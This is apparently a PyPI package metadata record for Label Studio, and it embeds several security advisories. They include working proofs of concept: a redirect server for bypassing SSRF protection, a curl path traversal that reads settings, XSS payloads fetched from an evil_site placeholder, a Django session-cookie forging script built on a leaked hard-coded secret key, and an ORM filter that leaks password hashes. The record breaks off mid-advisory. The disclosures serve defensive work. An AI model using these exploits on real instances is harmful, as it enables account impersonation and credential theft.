task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.4.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.4.post2/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.4.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"42985a578813adba53caec1aa373206bfd2df404c84829929acf623e1f40eefc","md5":"b0b7ea16b7440767cfe1a9d521b00b31","sha256":"3689e4c8bd3deedc4262c3d2bc79e574fa3389a328fa80c60a51e1132cd67d51"},"downloads":-1,"filename":"label_studio-0.4.4.post2-py3-none-any.whl","has_sig":false,"md5_digest":"b0b7ea16b7440767cfe1a9d521b00b31","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7182319,"upload_time":"2020-01-23T20:32:17","upload_time_iso_8601":"2020-01-23T20:32:17.173459Z","url":"https://files.pythonhosted.org/packages/42/98/5a578813adba53caec1aa373206bfd2df404c84829929acf623e1f40eefc/label_studio-0.4.4.post2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d8f76fa32eef231acc021909b51131dede43e7cbc20f0831ce09acf80aac0fd6","md5":"a0191a35d07f2bcde5826bb2569b9f1c","sha256":"44ce21482e2947ebdb8739abac80a16d58221be70878f56064cacc25103377d7"},"downloads":-1,"filename":"label-studio-0.4.4.post2.tar.gz","has_sig":false,"md5_digest":"a0191a35d07f2bcde5826bb2569b9f1c","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7115400,"upload_time":"2020-01-23T20:32:20","upload_time_iso_8601":"2020-01-23T20:32:20.558784Z","url":"https://files.pythonhosted.org/packages/d8/f7/6fa32eef231acc021909b51131dede43e7cbc20f0831ce09acf80aac0fd6/label-studio-0.4.4.post2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` 